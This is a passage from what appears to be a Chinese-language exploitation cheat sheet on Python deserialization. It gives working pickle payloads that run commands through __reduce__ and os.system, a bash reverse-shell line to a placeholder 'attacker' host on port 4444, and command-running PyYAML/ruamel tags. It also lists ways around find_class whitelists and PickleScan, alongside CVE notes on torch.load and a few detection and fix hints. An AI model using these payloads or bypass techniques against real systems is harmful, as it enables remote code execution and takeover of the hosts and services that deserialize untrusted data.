## 九、Python pickle 利用面

### 9.1 pickle 栈式虚拟机核心
```python
import pickle, pickletools
# opcode 速查：c=global(import) o=build R=reduce S=string t=tuple g=GET b=BINPUT .=stop
# 经典 payload：cos\nsystem\n(S'id'\ntR.
# 等价 Python 对象：pickle.dumps 后 pickletools.dis 可逐步解析指令
class Pwn:
    def __reduce__(self):   # __reduce__ 返回 (callable, args)，反序列化时执行 callable(*args)
        import os
        return (os.system, ('id',))
payload = pickle.dumps(Pwn())
# 反弹 shell / 一键生成：
cmd = "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"
print(pickle.dumps(Pwn()).hex())   # 或 base64.b64encode(pickle.dumps(...))
```

### 9.2 find_class 限制绕过
```python
# 防御方常继承 Unpickler 重写 find_class 做白名单 —— 绕过思路：
# 1. 白名单放行子模块但漏掉其危险成员（如允许 os 却放行 os.system / subprocess）
# 2. 利用非直接 import 的等价可达类：如 builtins.getattr、operator.attrgetter 组合
# 3. 序列化利用"已缓存/间接可达"的类（memo 复用）
# 4. 框架自带危险"加载器"类（如 torch._utils._rebuild_tensor_v2 曾可被滥用）
```

### 9.3 PyYAML / ruamel 变体
```yaml
# PyYAML：yaml.load() / yaml.unsafe_load() 危险（CVE-2020-1747 FullLoader 也危险）
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]
!!python/object/new:subprocess.Popen [["id"]]

# ruamel.yaml：默认 RuamelLoader 安全；unsafe_load 危险
!!python/object/apply:builtins.eval ["__import__('os').system('id')"]
```
```python
# 检测：扫描 yaml.load / yaml.unsafe_load / yaml.load(input, Loader=yaml.Loader) / FullLoader / unsafe_load
# 修复：yaml.safe_load()（PyYAML）、ruamel.yaml.YAML(typ='safe')
```

### 9.4 torch.load / ML 模型加载面（2025 关键）
```python
# CVE-2025-24357（vLLM）：torch.load(weights_only=False) 加载恶意模型权重 → 反序列化 RCE
# CVE-2025-32434（PyTorch）：即使 weights_only=True 仍可 RCE（2.6 修复，默认值翻转 + safe_globals 机制）
# 攻击路径：恶意 .pt/.pth/.bin 模型文件（HuggingFace 投毒、模型下载源被控、共享权重包）
# 防御：torch.load(..., weights_only=True) + 升级 PyTorch>=2.6；对模型文件做 pickle 扫描
```

### 9.5 生态攻击面与其他入口
```
# Django session（SESSION_ENGINE 使用数据库/cache 时默认 json，但自定义 backend 可能 pickle）
# Celery：task 参数走 pickle 序列化（CVE 历史上多次出现，默认改 json 后仍有 legacy）
# shelve / marshal.loads / jsonpickle.decode（py/object 结构）
# python-socketio CVE-2025-61765：Redis 消息队列中 pickle 反序列化（攻击者可写队列即 RCE）
# PickleScan 绕过 CVE-2025-1716：静态扫描工具可被构造的 pickle 流骗过（如利用 REDUCE 到 pip install）
# 检测指纹：\x80\x03/\x80\x04/\x80\x05、pickletools.dis 分析、fickling 逆向分析工具
```

